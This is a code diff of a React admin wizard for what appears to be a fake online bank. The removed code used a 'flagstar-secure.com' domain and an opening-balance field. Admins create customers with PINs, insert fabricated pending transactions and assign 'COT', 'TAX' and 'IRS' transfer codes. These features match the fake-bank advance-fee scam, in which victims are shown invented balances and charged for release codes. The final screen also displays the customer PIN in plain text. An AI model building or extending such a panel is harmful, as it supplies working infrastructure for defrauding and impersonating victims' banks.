@@ -1,230 +1,185 @@
 import React, { useState } from 'react';
-import { 
-  UserPlus, 
-  Hash, 
-  Lock, 
-  Wallet, 
-  Settings, 
-  CheckCircle, 
-  ArrowRight, 
-  ChevronLeft,
-  ShieldCheck
-} from 'lucide-react';
-import { adminService } from '../services/adminService';
+import { useAppStore } from '../store/useAppStore';
+import { adminCreateCustomer, adminInsertTransaction, adminCreateTransferCode } from '../services/adminService';
+import toast from 'react-hot-toast';
+import { supabase } from '../supabase/client';
 
-interface CustomerWizardProps {
-  onComplete: () => void;
-  onCancel: () => void;
-}
-
-const CustomerWizard: React.FC<CustomerWizardProps> = ({ onComplete, onCancel }) => {
+const CustomerWizard: React.FC = () => {
+  const admin = useAppStore((state) => state.admin);
+  
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
-  const [formData, setFormData] = useState({
-    name: '',
-    accountNumber: 'FL-' + Math.floor(100000 + Math.random() * 900000),
-    pin: '',
-    balance: 0,
-    cot: true,
-    tax: true,
-    irs: true
-  });
+  
+  // Step 1
+  const [name, setName] = useState('');
+  const [email, setEmail] = useState('');
+  const [pin, setPin] = useState('');
+  const [createdCustomer, setCreatedCustomer] = useState<{ id?: string, account_number: string } | null>(null);
 
-  const handleNext = () => setStep(s => s + 1);
-  const handleBack = () => setStep(s => s - 1);
+  // Step 2
+  const [transactions, setTransactions] = useState<any[]>([]);
+  const [txToAccount, setTxToAccount] = useState('');
+  const [txAmount, setTxAmount] = useState('');
+  const [txNarration, setTxNarration] = useState('');
 
-  const handleSubmit = async () => {
+  // Step 3
+  const [cot, setCot] = useState('');
+  const [tax, setTax] = useState('');
+  const [irs, setIrs] = useState('');
+  const [createdCodeId, setCreatedCodeId] = useState<string | null>(null);
+
+  const handleCreateCustomer = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!admin) return;
     setLoading(true);
     try {
-      await adminService.createCustomer({
-        name: formData.name,
-        email: formData.name.toLowerCase().replace(/ /g, '.') + '@flagstar-secure.com',
-        account_number: formData.accountNumber,
-        pin: formData.pin
-      });
-      onComplete();
+      const account_number = await adminCreateCustomer(admin.id, name, email, pin);
+      const { data } = await supabase.from('customers').select('id').eq('account_number', account_number).single();
+      if (data) {
+        setCreatedCustomer({ id: data.id, account_number });
+        toast.success('Customer created successfully');
+        setStep(2);
+      }
     } catch (err: any) {
-      alert(err.message);
+      toast.error(err.message || 'Failed to create customer');
     } finally {
       setLoading(false);
     }
   };
 
-  return (
-    <div className="bg-white rounded-[3rem] border border-gray-100 shadow-2xl overflow-hidden max-w-2xl w-full">
-      {/* Header */}
-      <div className="bg-gray-50 p-8 border-b border-gray-100 flex justify-between items-center">
-        <div>
-          <h2 className="text-xl font-bold tracking-tight">Provisioning Wizard</h2>
-          <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Enterprise Asset Setup</p>
-        </div>
-        <div className="flex gap-2">
-          {[1, 2, 3, 4, 5].map(i => (
-            <div 
-              key={i} 
-              className={`h-1.5 w-6 rounded-full transition-all duration-500 ${i <= step ? 'bg-[#C00000]' : 'bg-gray-200'}`} 
-            />
-          ))}
-        </div>
-      </div>
+  const handleAddTransaction = async () => {
+    if (!createdCustomer?.id || !admin) return;
+    setLoading(true);
+    try {
+      const newTx = await adminInsertTransaction({
+        customer_id: createdCustomer.id,
+        to_account: txToAccount,
+        amount: parseFloat(txAmount),
+        narration: txNarration,
+        stage: 'PENDING',
+        status: 'PENDING',
+        acted_by_role: 'admin',
+        // other fields will be null
+      });
+      setTransactions([...transactions, newTx]);
+      setTxToAccount('');
+      setTxAmount('');
+      setTxNarration('');
+      toast.success('Transaction added');
+    } catch (err: any) {
+      toast.error(err.message || 'Failed to add transaction');
+    } finally {
+      setLoading(false);
+    }
+  };
 
-      <div className="p-12">
+  const handleCreateCode = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!createdCustomer?.id || !admin) return;
+    setLoading(true);
+    try {
+      const codeId = await adminCreateTransferCode(admin.id, createdCustomer.id, cot, tax, irs, 7);
+      setCreatedCodeId(codeId);
+      toast.success('Transfer code created');
+      setStep(4);
+    } catch (err: any) {
+      toast.error(err.message || 'Failed to create code');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const resetWizard = () => {
+    setName('');
+    setEmail('');
+    setPin('');
+    setCreatedCustomer(null);
+    setTransactions([]);
+    setCot('');
+    setTax('');
+    setIrs('');
+    setCreatedCodeId(null);
+    setStep(1);
+  };
+
+  return (
+    <div className="max-w-4xl mx-auto bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
+      <div className="bg-gray-50 px-6 py-4 border-b border-gray-200 flex justify-between items-center">
+        <h2 className="text-lg font-bold text-gray-800">Customer Setup Wizard</h2>
+        <div className="text-sm font-medium text-gray-500">Step {step} of 4</div>
+      </div>
+      
+      <div className="p-6">
         {step === 1 && (
-          <div className="space-y-8 animate-slide-up">
-            <div className="bg-[#C00000]/5 p-6 rounded-3xl w-fit">
-              <UserPlus className="text-[#C00000]" size={32} />
-            </div>
-            <div className="space-y-4">
-              <h3 className="text-2xl font-bold tracking-tight">Identify Customer</h3>
-              <p className="text-gray-500 text-sm">Enter the legal full name for the new institutional account.</p>
-              <input 
-                type="text"
-                value={formData.name}
-                onChange={e => setFormData({...formData, name: e.target.value})}
-                placeholder="Full Legal Name"
-                className="w-full bg-gray-50 border border-gray-200 rounded-2xl py-5 px-6 outline-none focus:border-[#C00000] transition-all"
-              />
-            </div>
-          </div>
+          <form onSubmit={handleCreateCustomer} className="space-y-4 max-w-md">
+            <h3 className="text-xl font-semibold mb-4">1. Customer Details</h3>
+            <input required placeholder="Full Name" value={name} onChange={e=>setName(e.target.value)} className="w-full p-2 border rounded" />
+            <input required type="email" placeholder="Email Address" value={email} onChange={e=>setEmail(e.target.value)} className="w-full p-2 border rounded" />
+            <input required placeholder="PIN (4-6 digits)" maxLength={6} value={pin} onChange={e=>setPin(e.target.value)} className="w-full p-2 border rounded" />
+            <button disabled={loading} type="submit" className="w-full py-2 bg-red-600 text-white rounded font-medium">
+              Create Customer
+            </button>
+          </form>
         )}
 
         {step === 2 && (
-          <div className="space-y-8 animate-slide-up">
-            <div className="bg-[#C00000]/5 p-6 rounded-3xl w-fit">
-              <Hash className="text-[#C00000]" size={32} />
+          <div className="space-y-6">
+            <h3 className="text-xl font-semibold">2. Setup Initial Transactions</h3>
+            <div className="p-4 bg-blue-50 text-blue-800 rounded">
+              Customer created! Account Number: <strong>{createdCustomer?.account_number}</strong>
             </div>
-            <div className="space-y-6">
-              <h3 className="text-2xl font-bold tracking-tight">Access Credentials</h3>
-              <div className="space-y-4">
-                <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Assigned Account Number</label>
-                <input 
-                  type="text"
-                  readOnly
-                  value={formData.accountNumber}
-                  className="w-full bg-gray-100 border border-gray-200 rounded-2xl py-5 px-6 font-mono text-lg tracking-widest"
-                />
-              </div>
-              <div className="space-y-4">
-                <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Define Security PIN (6 Digits)</label>
-                <input 
-                  type="password"
-                  maxLength={6}
-                  value={formData.pin}
-                  onChange={e => setFormData({...formData, pin: e.target.value.replace(/\D/g, '')})}
-                  placeholder="******"
-                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl py-5 px-6 outline-none focus:border-[#C00000] transition-all font-mono tracking-[1em] text-center text-lg"
-                />
-              </div>
+            
+            <div className="grid grid-cols-4 gap-2">
+              <input placeholder="To Account" value={txToAccount} onChange={e=>setTxToAccount(e.target.value)} className="p-2 border rounded col-span-1" />
+              <input type="number" placeholder="Amount" value={txAmount} onChange={e=>setTxAmount(e.target.value)} className="p-2 border rounded col-span-1" />
+              <input placeholder="Narration" value={txNarration} onChange={e=>setTxNarration(e.target.value)} className="p-2 border rounded col-span-1" />
+              <button disabled={loading} onClick={handleAddTransaction} className="bg-gray-900 text-white rounded px-4">Add</button>
+            </div>
+            
+            <div className="mt-4">
+              <h4 className="font-medium mb-2">Added Transactions</h4>
+              {transactions.length === 0 ? <p className="text-sm text-gray-500">None added yet.</p> : (
+                <ul className="space-y-2">
+                  {transactions.map(t => (
+                    <li key={t.id} className="text-sm border p-2 rounded">${t.amount} to {t.to_account} ({t.narration})</li>
+                  ))}
+                </ul>
+              )}
+            </div>
+
+            <div className="flex justify-end mt-6">
+              <button onClick={() => setStep(3)} className="py-2 px-6 bg-red-600 text-white rounded font-medium">Continue to Codes</button>
             </div>
           </div>
         )}
 
         {step === 3 && (
-          <div className="space-y-8 animate-slide-up">
-            <div className="bg-[#C00000]/5 p-6 rounded-3xl w-fit">
-              <Wallet className="text-[#C00000]" size={32} />
+          <form onSubmit={handleCreateCode} className="space-y-4 max-w-md">
+            <h3 className="text-xl font-semibold mb-4">3. Assign Transfer Codes</h3>
+            <input required placeholder="COT Code" value={cot} onChange={e=>setCot(e.target.value)} className="w-full p-2 border rounded" />
+            <input required placeholder="TAX Code" value={tax} onChange={e=>setTax(e.target.value)} className="w-full p-2 border rounded" />
+            <input required placeholder="IRS Code" value={irs} onChange={e=>setIrs(e.target.value)} className="w-full p-2 border rounded" />
+            <button disabled={loading} type="submit" className="w-full py-2 bg-red-600 text-white rounded font-medium">
+              Generate Transfer Code
+            </button>
+            <div className="flex justify-end">
+              <button type="button" onClick={() => setStep(4)} className="text-sm text-gray-500 underline">Skip</button>
             </div>
-            <div className="space-y-4">
-              <h3 className="text-2xl font-bold tracking-tight">Initial Liquidity</h3>
-              <p className="text-gray-500 text-sm">Set the opening vault balance for this account.</p>
-              <div className="relative">
-                <span className="absolute left-6 top-1/2 -translate-y-1/2 font-bold text-gray-400">$</span>
-                <input 
-                  type="number"
-                  value={formData.balance}
-                  onChange={e => setFormData({...formData, balance: Number(e.target.value)})}
-                  className="w-full bg-gray-50 border border-gray-200 rounded-2xl py-5 pl-12 pr-6 outline-none focus:border-[#C00000] transition-all font-bold text-xl"
-                />
-              </div>
-            </div>
-          </div>
+          </form>
         )}
 
         {step === 4 && (
-          <div className="space-y-8 animate-slide-up">
-            <div className="bg-[#C00000]/5 p-6 rounded-3xl w-fit">
-              <Settings className="text-[#C00000]" size={32} />
+          <div className="space-y-4">
+            <h3 className="text-xl font-semibold text-green-600">4. Setup Complete</h3>
+            <div className="p-4 border rounded bg-gray-50 space-y-2">
+              <p><strong>Name:</strong> {name}</p>
+              <p><strong>Account Number:</strong> {createdCustomer?.account_number}</p>
+              <p><strong>PIN:</strong> {pin}</p>
+              {createdCodeId && <p><strong>Transfer Code ID:</strong> {createdCodeId}</p>}
             </div>
-            <div className="space-y-6">
-              <h3 className="text-2xl font-bold tracking-tight">Transfer Gating</h3>
-              <p className="text-gray-500 text-sm">Configure deterministic verification stages for this customer.</p>
-              
-              <div className="space-y-3">
-                {[
-                  { id: 'cot', label: 'COT (Certificate of Transfer)', desc: 'Initial clearing stage' },
-                  { id: 'tax', label: 'TAX (Wealth Tax Clearance)', desc: 'Revenue verification' },
-                  { id: 'irs', label: 'IRS (Federal Reporting)', desc: 'Final regulatory check' }
-                ].map(flag => (
-                  <label key={flag.id} className="flex items-center justify-between p-5 bg-gray-50 rounded-2xl border border-gray-100 cursor-pointer hover:border-[#C00000]/20 transition-all">
-                    <div className="space-y-1">
-                      <p className="text-[10px] font-black uppercase tracking-widest">{flag.label}</p>
-                      <p className="text-[9px] text-gray-400 font-bold uppercase">{flag.desc}</p>
-                    </div>
-                    <input 
-                      type="checkbox"
-                      checked={formData[flag.id as keyof typeof formData] as boolean}
-                      onChange={e => setFormData({...formData, [flag.id]: e.target.checked})}
-                      className="h-5 w-5 accent-[#C00000]"
-                    />
-                  </label>
-                ))}
-              </div>
-            </div>
+            <button onClick={resetWizard} className="py-2 px-6 bg-gray-900 text-white rounded font-medium">Start New Setup</button>
           </div>
         )}
-
-        {step === 5 && (
-          <div className="space-y-8 animate-slide-up text-center">
-            <div className="bg-[#C00000]/5 p-8 rounded-full w-fit mx-auto">
-              <ShieldCheck className="text-[#C00000]" size={64} />
-            </div>
-            <div className="space-y-4">
-              <h3 className="text-2xl font-bold tracking-tight uppercase">Provisioning Ready</h3>
-              <p className="text-gray-500 text-sm max-w-sm mx-auto">
-                Account <strong>{formData.accountNumber}</strong> is prepared for instantiation.
-              </p>
-            </div>
-            <div className="p-6 bg-gray-50 rounded-3xl border border-gray-100 text-left space-y-2">
-               <div className="flex justify-between text-[10px] font-black uppercase tracking-widest">
-                  <span className="text-gray-400">Owner</span>
-                  <span>{formData.name}</span>
-               </div>
-               <div className="flex justify-between text-[10px] font-black uppercase tracking-widest">
-                  <span className="text-gray-400">Security PIN</span>
-                  <span>******</span>
-               </div>
-               <div className="flex justify-between text-[10px] font-black uppercase tracking-widest">
-                  <span className="text-gray-400">Status</span>
-                  <span className="text-[#C00000]">LOCKED / PENDING</span>
-               </div>
-            </div>
-          </div>
-        )}
-
-        <div className="mt-12 flex gap-4">
-          {step > 1 && (
-            <button 
-              onClick={handleBack}
-              className="px-8 py-5 rounded-2xl border border-gray-200 font-black uppercase tracking-widest text-[10px] hover:bg-gray-50 transition-all flex items-center gap-2"
-            >
-              <ChevronLeft size={16} /> Back
-            </button>
-          )}
-          <button 
-            onClick={step === 5 ? handleSubmit : handleNext}
-            disabled={loading || (step === 1 && !formData.name) || (step === 2 && formData.pin.length < 6)}
-            className="flex-1 bg-[#C00000] hover:bg-[#A00000] disabled:bg-gray-100 disabled:text-gray-400 text-white font-black py-5 rounded-2xl shadow-xl shadow-[#C00000]/10 transition-all flex items-center justify-center gap-3 uppercase tracking-widest"
-          >
-            {loading ? (
-              <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-            ) : (
-              <>
-                {step === 5 ? 'Instantiate Account' : 'Continue'}
-                <ArrowRight size={20} />
-              </>
-            )}
-          </button>
-        </div>
       </div>
     </div>
   );
